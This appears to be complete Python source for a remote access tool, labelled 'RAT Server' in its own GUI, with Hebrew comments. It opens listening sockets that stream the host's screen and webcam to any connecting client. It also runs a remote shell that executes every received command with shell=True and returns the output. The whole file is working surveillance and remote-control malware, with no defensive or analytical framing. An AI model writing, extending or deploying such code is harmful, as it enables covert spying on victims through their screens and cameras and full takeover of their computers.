import socket
import struct
import threading
import cv2
import numpy as np
import mss
import time
import subprocess
import customtkinter as ctk
import tkinter.messagebox

# ===== קונפיג =====
PORT_SCREEN = 9999
PORT_SHELL = 9998
PORT_CAMERA = 9996
IP = '0.0.0.0'

running = False   # משתנה בקרה לעצירת השרת
threads = []      # רשימת threads פעילים


# ===== Handlers =====
def screen_handler(client_socket, address):
    print(f"[SCREEN] לקוח התחבר מ-{address}")
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while running:
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                success, encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
                if not success:
                    continue
                data = encoded.tobytes()
                packet = struct.pack("!I", len(data)) + data
                client_socket.sendall(packet)
                time.sleep(0.03)
    except Exception as e:
        print(f"[SCREEN] חיבור מנותק: {e}")
    finally:
        client_socket.close()


def camera_handler(client_socket, address):
    print(f"[CAMERA] לקוח התחבר מ-{address}")
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("לא ניתן לפתוח מצלמה")
        while running:
            ret, frame = cap.read()
            if not ret:
                break
            success, encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            if not success:
                continue
            data = encoded.tobytes()
            packet = struct.pack("!I", len(data)) + data
            client_socket.sendall(packet)
            time.sleep(0.05)
    except Exception as e:
        print(f"[CAMERA] שגיאה: {e}")
    finally:
        if 'cap' in locals():
            cap.release()
        client_socket.close()


def shell_handler(client_socket, address):
    print(f"[SHELL] לקוח התחבר מ-{address}")
    try:
        while running:
            command_data = client_socket.recv(4096)
            if not command_data:
                break
            command = command_data.decode().strip()
            print(f"[SHELL] פקודה: {command}")
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10, text=True)
            except subprocess.CalledProcessError as e:
                result = e.output
            except Exception as e:
                result = f"שגיאה: {str(e)}"
            client_socket.sendall((result + "<END>").encode("utf-8"))
    except Exception as e:
        print(f"[SHELL] שגיאה: {e}")
    finally:
        client_socket.close()
        print(f"[SHELL] חיבור מ-{address} נסגר")


# ===== שרת כללי =====
def accept_clients(server_socket, handler):
    while running:
        try:
            client_sock, addr = server_socket.accept()
            t = threading.Thread(target=handler, args=(client_sock, addr), daemon=True)
            t.start()
            threads.append(t)
        except OSError:
            break  # הסוקט נסגר


def start_server():
    global running, threads
    running = True
    threads = []

    try:
        # Screen
        screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        screen_socket.bind((IP, PORT_SCREEN))
        screen_socket.listen(5)

        # Shell
        shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell_socket.bind((IP, PORT_SHELL))
        shell_socket.listen(5)

        # Camera
        camera_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        camera_socket.bind((IP, PORT_CAMERA))
        camera_socket.listen(5)

        # Threads for accept
        threading.Thread(target=accept_clients, args=(screen_socket, screen_handler), daemon=True).start()
        threading.Thread(target=accept_clients, args=(shell_socket, shell_handler), daemon=True).start()
        threading.Thread(target=accept_clients, args=(camera_socket, camera_handler), daemon=True).start()

        print("[SERVER] השרת הופעל")

    except Exception as e:
        print(f"[SERVER] שגיאה בהפעלה: {e}")
        running = False


def stop_server():
    global running
    running = False
    print("[SERVER] השרת נעצר")


# ===== GUI =====
class ServerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("RAT Server")
        self.geometry("300x200")

        self.status_label = ctk.CTkLabel(self, text="Server Stopped", fg_color="red")
        self.status_label.pack(pady=20)

        self.start_btn = ctk.CTkButton(self, text="Start Server", command=self.start_server_gui)
        self.start_btn.pack(pady=10)

        self.stop_btn = ctk.CTkButton(self, text="Stop Server", command=self.stop_server_gui, state="disabled")
        self.stop_btn.pack(pady=10)

    def start_server_gui(self):
        threading.Thread(target=start_server, daemon=True).start()
        self.status_label.configure(text="Server Running", fg_color="green")
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")

    def stop_server_gui(self):
        stop_server()
        self.status_label.configure(text="Server Stopped", fg_color="red")
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")


if __name__ == "__main__":
    ctk.set_appearance_mode("dark")
    app = ServerGUI()
    app.mainloop()
